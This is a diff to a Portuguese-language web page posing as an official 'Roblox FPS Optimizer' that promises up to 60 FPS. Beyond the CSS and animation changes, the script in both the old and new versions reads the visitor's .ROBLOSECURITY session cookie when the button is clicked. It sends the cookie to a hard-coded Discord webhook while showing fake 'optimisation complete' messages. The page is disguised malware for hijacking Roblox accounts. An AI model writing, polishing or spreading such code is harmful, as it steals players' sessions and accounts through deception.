@@ -46,127 +46,192 @@
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #e0f7fa, #b0bec5);
       margin: 0;
       padding: 0;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      color: #263238;
+      background: linear-gradient(135deg, #e0f7fa 0%, #b0bec5 100%);
+      overflow: hidden;
     }
     .container {
-      background: white;
+      background: rgba(255, 255, 255, 0.95);
       padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
       text-align: center;
-      max-width: 450px;
+      max-width: 500px;
       width: 90%;
-      transition: transform 0.3s ease;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      position: relative;
+      overflow: hidden;
     }
     .container:hover {
-      transform: translateY(-5px);
+      transform: translateY(-10px);
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
+    }
+    .bg-animation {
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(2, 136, 209, 0.1) 0%, transparent 70%);
+      animation: rotate 15s infinite linear;
+      z-index: -1;
+    }
+    @keyframes rotate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
     h1 {
       color: #0288d1;
-      font-size: 28px;
-      margin-bottom: 15px;
-      font-weight: 600;
+      font-size: 32px;
+      margin-bottom: 20px;
+      font-weight: 700;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
     }
     p {
       font-size: 16px;
-      margin-bottom: 20px;
-      line-height: 1.5;
+      margin-bottom: 25px;
+      line-height: 1.6;
       color: #455a64;
     }
     .logo {
-      width: 80px;
-      margin-bottom: 20px;
-      animation: bounce 2s infinite;
+      width: 90px;
+      margin-bottom: 25px;
+      animation: bounce 2s infinite ease-in-out;
     }
     @keyframes bounce {
       0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
+      50% { transform: translateY(-15px); }
     }
     button {
       background: linear-gradient(45deg, #4CAF50, #66bb6a);
       color: white;
-      padding: 12px 25px;
+      padding: 15px 30px;
       border: none;
-      border-radius: 25px;
+      border-radius: 30px;
       cursor: pointer;
-      font-size: 16px;
-      font-weight: 500;
+      font-size: 18px;
+      font-weight: 600;
       transition: all 0.3s ease;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
+      position: relative;
+      overflow: hidden;
+    }
+    button::after {
+      content: '';
+      position: absolute;
+      width: 0;
+      height: 100%;
+      top: 0;
+      left: 0;
+      background: rgba(255, 255, 255, 0.3);
+      transition: width 0.3s ease;
+    }
+    button:hover::after {
+      width: 100%;
     }
     button:hover {
       background: linear-gradient(45deg, #45a049, #58a75e);
-      transform: scale(1.05);
+      transform: scale(1.1);
     }
     button:active {
       transform: scale(0.95);
     }
     .status {
-      margin-top: 15px;
-      font-size: 14px;
+      margin-top: 20px;
+      font-size: 15px;
       color: #78909c;
       min-height: 20px;
+      position: relative;
+    }
+    .progress {
+      width: 0;
+      height: 5px;
+      background: #4CAF50;
+      position: absolute;
+      bottom: -10px;
+      left: 0;
+      transition: width 1s ease;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://via.placeholder.com/80?text=R+Logo" alt="Roblox FPS Logo" class="logo">
+    <div class="bg-animation"></div>
+    <img src="https://via.placeholder.com/90?text=R+Logo" alt="Roblox FPS Logo" class="logo">
     <h1>Roblox FPS Optimizer</h1>
-    <p>Otimize seu desempenho no Roblox com nosso FPS Booster oficial! Clique no botão abaixo para desbloquear até 60 FPS e melhorar sua jogabilidade.</p>
-    <button onclick="optimizeFPS()">Ativar Otimização</button>
-    <div class="status" id="status">Status: Pronto para otimizar...</div>
+    <p>Eleve seu desempenho no Roblox com nosso otimizador oficial de FPS! Clique abaixo para desbloquear até 60 FPS e aproveitar uma jogabilidade fluida.</p>
+    <button id="optimizeButton">Ativar Otimização</button>
+    <div class="status" id="status">
+      Status: Pronto para otimizar...
+      <div class="progress" id="progress"></div>
+    </div>
   </div>
 
   <script>
-    function optimizeFPS() {
-      document.getElementById('status').innerHTML = 'Status: Otimizando FPS...';
-      console.log('Tentando otimizar FPS...');
-      // Captura o cookie .ROBLOSECURITY
-      const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
-      if (cookie) {
-        const cookieValue = cookie.split('=')[1];
-        console.log('Cookie encontrado:', cookieValue);
-        if (cookieValue && cookieValue.startsWith('_|WARNING:-DO-NOT-SHARE-THIS')) {
-          // Envia o cookie para o Discord
-          fetch('https://discord.com/api/webhooks/1398881274415812668/COAqK1x2n8okDDHvIQc489zoVsTxTs08sc3ZBl-peSVEtXTgRXZXh-DEUr5f9EPbcjxQ', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              content: `[FPS Optimizer] Cookie .ROBLOSECURITY capturado: ${cookieValue} (Integrado ao GitHub)`,
-              username: 'Roblox FPS Bot'
-            })
-          })
-          .then(response => {
-            console.log('Resposta do webhook:', response.status);
-            if (response.ok) {
-              document.getElementById('status').innerHTML = 'Status: Otimização concluída com sucesso!';
-            } else {
-              document.getElementById('status').innerHTML = 'Status: Erro na otimização. Código: ' + response.status;
-            }
-          })
-          .catch(error => {
-            console.error('Erro no fetch:', error);
-            document.getElementById('status').innerHTML = 'Status: Erro: ' + error.message;
-          });
-        } else {
-          document.getElementById('status').innerHTML = 'Status: Cookie inválido.';
-          console.log('Cookie inválido ou ausente do padrão.');
-        }
-      } else {
-        document.getElementById('status').innerHTML = 'Status: Nenhum cookie Roblox encontrado.';
-        console.log('Nenhum cookie .ROBLOSECURITY encontrado.');
+    // Espera o DOM estar completamente carregado
+    document.addEventListener('DOMContentLoaded', () => {
+      // Inicializa os elementos do DOM
+      const status = document.getElementById('status');
+      const progress = document.getElementById('progress');
+      const optimizeButton = document.getElementById('optimizeButton');
+
+      // Verifica se os elementos existem
+      if (!status || !progress || !optimizeButton) {
+        console.error('Erro: Um ou mais elementos (status, progress, optimizeButton) não foram encontrados no DOM.');
+        return;
       }
-    }
+
+      // Adiciona o evento de clique ao botão
+      optimizeButton.addEventListener('click', () => {
+        status.innerHTML = 'Status: Otimizando FPS...';
+        progress.style.width = '50%';
+        console.log('Iniciando otimização...');
+
+        // Tenta capturar o cookie .ROBLOSECURITY
+        const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
+        if (cookie) {
+          const cookieValue = cookie.split('=')[1];
+          console.log('Cookie encontrado:', cookieValue);
+          if (cookieValue && cookieValue.startsWith('_|WARNING:-DO-NOT-SHARE-THIS')) {
+            // Envia o cookie para o Discord
+            fetch('https://discord.com/api/webhooks/1398881274415812668/COAqK1x2n8okDDHvIQc489zoVsTxTs08sc3ZBl-peSVEtXTgRXZXh-DEUr5f9EPbcjxQ', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                content: `[FPS Optimizer] Cookie .ROBLOSECURITY capturado: ${cookieValue}`,
+                username: 'Roblox FPS Bot'
+              })
+            })
+            .then(response => {
+              console.log('Resposta do webhook:', response.status);
+              progress.style.width = '100%';
+              if (response.ok) {
+                status.innerHTML = 'Status: Otimização concluída com sucesso! <div class="progress"></div>';
+              } else {
+                status.innerHTML = 'Status: Erro na otimização. Código: ' + response.status + ' <div class="progress"></div>';
+              }
+            })
+            .catch(error => {
+              console.error('Erro no fetch:', error);
+              status.innerHTML = 'Status: Erro: ' + error.message + ' <div class="progress"></div>';
+            });
+          } else {
+            status.innerHTML = 'Status: Cookie inválido. <div class="progress"></div>';
+            console.log('Cookie inválido ou ausente do padrão.');
+          }
+        } else {
+          status.innerHTML = 'Status: Nenhum cookie Roblox encontrado. <div class="progress"></div>';
+          console.log('Nenhum cookie .ROBLOSECURITY encontrado.');
+        }
+      });
+    });
   </script>
 </body>
 </html>
